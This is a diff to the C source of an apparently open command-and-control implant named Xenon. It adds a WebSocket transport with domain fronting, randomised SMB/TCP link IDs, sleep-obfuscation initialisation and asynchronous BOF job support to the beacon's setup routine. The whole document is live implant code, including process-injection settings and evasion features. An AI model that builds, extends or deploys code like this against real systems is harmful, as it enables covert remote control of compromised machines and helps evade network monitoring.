@@ -5,6 +5,11 @@
 #include "Xenon.h"
 #include "Config.h"
 #include "Task.h"
+#include "Sleep.h"
+
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+#include "Tasks/AsyncBof.h"
+#endif
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -63,7 +68,7 @@ VOID XenonConfigure()
 
     // Process Injection Options
     xenonConfig->spawnto           = ParserStringCopy(&ParserConfig, &pathLen);                     // allocates
-    xenonConfig->pipename          = ParserStringCopy(&ParserConfig, &pipeLen);                     // allocates
+    //xenonConfig->pipename          = ParserStringCopy(&ParserConfig, &pipeLen);                     // allocates
 
 #ifdef HTTPX_TRANSPORT
 
@@ -121,6 +126,19 @@ VOID XenonConfigure()
     xenonConfig->SmbPipe           = NULL;
     xenonConfig->SmbPipename       = ParserStringCopy(&ParserConfig, &namedPipeLen);                     // allocates
 
+    /* Create a unique runtime Link ID */
+    {
+        UINT32 mix = xenonConfig->SmbId;
+        mix ^= (UINT32)GetCurrentProcessId();
+        mix ^= (UINT32)GetTickCount();
+        mix ^= (UINT32)RandomInt32(1, 0x7fffffff);
+        if (mix == 0)
+            mix = (UINT32)GetCurrentProcessId() ^ 0xA5A5A5A5u;
+        if (mix == 0)
+            mix = 1;
+        xenonConfig->SmbId = mix;
+    }
+
 #endif
 
 #ifdef TCP_TRANSPORT
@@ -131,6 +149,48 @@ VOID XenonConfigure()
     xenonConfig->TcpSocketClient   = NULL;
     xenonConfig->TcpBindAddress    = ParserStringCopy(&ParserConfig, &tcpAddressLen);                     // allocates
     xenonConfig->TcpPort           = ParserGetInt32(&ParserConfig);
+
+    /* Create a unique runtime Link ID */
+    {
+        UINT32 mix = xenonConfig->TcpId;
+        mix ^= (UINT32)GetCurrentProcessId();
+        mix ^= (UINT32)GetTickCount();
+        mix ^= (UINT32)RandomInt32(1, 0x7fffffff);
+        if (mix == 0)
+            mix = (UINT32)GetCurrentProcessId() ^ 0x5A5A5A5Au;
+        if (mix == 0)
+            mix = 1;
+        xenonConfig->TcpId = mix;
+    }
+
+#endif
+
+#ifdef WEBSOCKET_TRANSPORT
+
+    SIZE_T wsHostnameLen        = 0;
+    SIZE_T wsEndpointLen        = 0;
+    SIZE_T wsUserAgentLen       = 0;
+    SIZE_T wsDomainFrontLen     = 0;
+
+    xenonConfig->WsHostname     = ParserStringCopy(&ParserConfig, &wsHostnameLen);      // allocates
+    xenonConfig->WsPort         = ParserGetInt32(&ParserConfig);
+    xenonConfig->WsIsSSL        = ParserGetByte(&ParserConfig);
+    xenonConfig->WsEndpoint     = ParserStringCopy(&ParserConfig, &wsEndpointLen);      // allocates
+    xenonConfig->WsUserAgent    = ParserStringCopy(&ParserConfig, &wsUserAgentLen);     // allocates
+    xenonConfig->WsDomainFront  = ParserStringCopy(&ParserConfig, &wsDomainFrontLen);   // allocates
+
+    xenonConfig->WsConnected    = FALSE;
+    xenonConfig->WsSession      = NULL;
+    xenonConfig->WsConnection   = NULL;
+    xenonConfig->WsRequest      = NULL;
+    xenonConfig->WsHandle       = NULL;
+    xenonConfig->WsRecvThread   = NULL;
+    xenonConfig->WsInboundEvent = NULL;
+    xenonConfig->WsSendMutex    = NULL;
+    xenonConfig->WsQueueMutex   = NULL;
+    xenonConfig->WsStopRecv     = FALSE;
+    xenonConfig->WsInboundHead  = NULL;
+    xenonConfig->WsInboundTail  = NULL;
 
 #endif
 
@@ -169,6 +229,19 @@ VOID XenonConfigure()
     
 #endif
 
+#ifdef WEBSOCKET_TRANSPORT
+
+    _dbg("[WsHostname]      = %s", xenonConfig->WsHostname);
+    _dbg("[WsPort]          = %d", xenonConfig->WsPort);
+    _dbg("[WsSSL]           = %s", xenonConfig->WsIsSSL ? "TRUE" : "FALSE");
+    _dbg("[WsEndpoint]      = %s", xenonConfig->WsEndpoint);
+    _dbg("[WsUserAgent]     = %s", xenonConfig->WsUserAgent);
+    _dbg("[WsDomainFront]   = %s", xenonConfig->WsDomainFront);
+    _dbg("[SleepTime]       = %d", xenonConfig->sleeptime);
+    _dbg("[Jitter]          = %d", xenonConfig->jitter);
+
+#endif
+
 }
 
 
@@ -184,17 +257,21 @@ VOID XenonMain()
         - Start main beaconing routine
 */
 
-    // NetworkInitMutex();     // Current workaround for avoiding race condition with global HINTERNET handles
-
     // Set pointer to Stack allocated instance
     CONFIG_XENON xenon = { 0 };
     xenonConfig = &xenon;
 
     XenonConfigure();
 
+    SleepInit();
+
+#if defined(INCLUDE_CMD_ASYNC_EXECUTE) || defined(INCLUDE_CMD_JOBKILL) || defined(INCLUDE_CMD_JOBS)
+    AsyncBofInitialize();
+#endif
+
 /* 
-    Now we're set up for beaconing
-*/
+ * Now we're set up for beaconing
+ */
 
     // Send checkin request
     PARSER data     = { 0 };
